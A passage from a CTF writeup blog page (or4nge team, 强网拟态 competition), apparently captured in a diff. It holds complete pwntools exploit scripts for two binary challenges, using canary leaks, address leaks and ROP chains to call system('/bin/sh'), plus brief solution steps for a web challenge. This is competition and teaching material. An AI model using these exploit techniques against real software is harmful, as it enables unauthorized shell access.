+canary <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">7</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+print (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;canary: </span><span style="color:#e6db74">{</span>canary<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+gdb<span style="color:#f92672">.</span>attach(p, <span style="color:#e6db74">&#39;b *$rebase(0xb03)&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">=</span> p64(base_addr <span style="color:#f92672">+</span> pop_rdi_ret)<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> p64(base_addr <span style="color:#f92672">+</span> binsh_addr)<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> p64(base_addr <span style="color:#f92672">+</span> call_system)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xc8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> canary <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> payload)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h3 id="pwn1-1">pwn1-1</h3>
+<pre tabindex="0"><code>+---------------+​
+|.   index.     |​
++---------------+​
+|    buffer     |​
++---------------+​
+|.   &amp;buffer.   |​
++---------------+​
+|    &amp;index.    |​
++---------------+
+</code></pre><p>泄漏&amp;buffer​
+修改&amp;buffer同时修改&amp;index​
+写入payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>, <span style="color:#e6db74">&#39;-F&#39;</span>, <span style="color:#e6db74">&#39;#</span><span style="color:#e6db74">{pane_pid}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;-P&#39;</span>]<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./pwn1-1&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+func_func_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12A0</span><span style="color:#960050;background-color:#1e0010">​</span>
+pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1943</span><span style="color:#960050;background-color:#1e0010">​</span>
+call_system <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x11A2</span><span style="color:#960050;background-color:#1e0010">​</span>
+binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4050</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;try something</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;some tricks</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+func_addr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#960050;background-color:#1e0010">​</span>
+func_addr <span style="color:#f92672">=</span> int(func_addr<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+print (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;func_addr: </span><span style="color:#e6db74">{</span>hex(func_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+base_addr <span style="color:#f92672">=</span> func_addr <span style="color:#f92672">-</span> func_func_addr<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hello&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+gdb<span style="color:#f92672">.</span>attach(p, <span style="color:#e6db74">&#39;b *$rebase(0x1423)&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0xe0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvline()<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvline()<span style="color:#960050;background-color:#1e0010">​</span>
+buf_value <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+print (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;buf = </span><span style="color:#e6db74">{</span>hex(buf_value)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">=</span> p64(base_addr <span style="color:#f92672">+</span> pop_rdi_ret)<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> p64(base_addr <span style="color:#f92672">+</span> binsh_addr)<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> p64(base_addr <span style="color:#f92672">+</span> call_system)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># p.sendline(payload)​</span>
+p<span style="color:#f92672">.</span>sendline(p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0xe0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p64(buf_value <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf8</span>) <span style="color:#f92672">+</span> p64(buf_value) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> payload)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># p.recvline()​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h3 id="web_mimic">web_mimic</h3>
+<p>Ctrl+U在源码中看到NTLM hash和encrypt word，NTLM hash在线解密得到密钥123，DES在线解密密文得到以下信息：​</p>
+<pre tabindex="0"><code>1.maybe used first url get random:​
+/mimic_storage​
+​
+​
+2.maybe used second url get flag:​
+/getflag?sec=random&amp;path=xxxx​
+​
+xxx is:​
+bAzlsD1ChiFW5eMC5tUokHErPkdjqARE
+</code></pre><p>按照步骤拿到random、xxx，url传参拿到flag。​</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/writeup/">Writeup</a>
+        
+            <a href="/tags/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/">“强网”拟态</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/post/wdb2022-writeup-by-or4nge/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2022网鼎杯初赛 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/qwb2022-writeup-by-or4nge/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">qwb2022 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/ciscn-2022-north-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/ciscn-2022-north-writeup-by-or4nge/cover.fdd1e3d117f12d7fcd887f75f2c6085f_hu64e9dce0f7c55970c8dfa2838c4ad483_501581_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-/dHj0RfxLX/NiH918sYIXw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CISCN2022 华北分赛区 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/ciscn-2022-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/ciscn-2022-writeup-by-or4nge/cover.dd9a1f3516fd809e1fd436da1fd62443_hua298b546d0b49e7ca84fa027f7c430e6_662553_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-3ZofNRb9gJ4f1DbaH9YkQw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CISCN2022 初赛 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/starctf2022-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/starctf2022-writeup-by-or4nge/cover.5cd75ed8824fecadd0a744a29cff3c66_hu1b2e905ab849912933a39ffac9637886_354329_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-XNde2IJP7K3Qp0SinP88Zg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">starCTF2022 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 or4nge
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#ezus">ezus</a></li>
+        <li><a href="#popsql">Popsql</a></li>
+        <li><a href="#whoyouare">WHOYOUARE</a></li>
+        <li><a href="#没有人比我更懂py">没有人比我更懂py​</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#bfbf">bfbf</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#welcome">welcome</a></li>
+        <li><a href="#s3quences">S3qUenCEs​</a></li>
+        <li><a href="#babymisc">Babymisc​</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#weekrandom">weekrandom</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#indir">Indir</a></li>
+        <li><a href="#comeongo">comeongo</a></li>
+      </ul>
+    </li>
+    <li><a href="#mimic">Mimic</a>
+      <ul>
+        <li><a href="#pwn1">pwn1</a></li>
+        <li><a href="#pwn1-1">pwn1-1</a></li>
+        <li><a href="#web_mimic">web_mimic</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
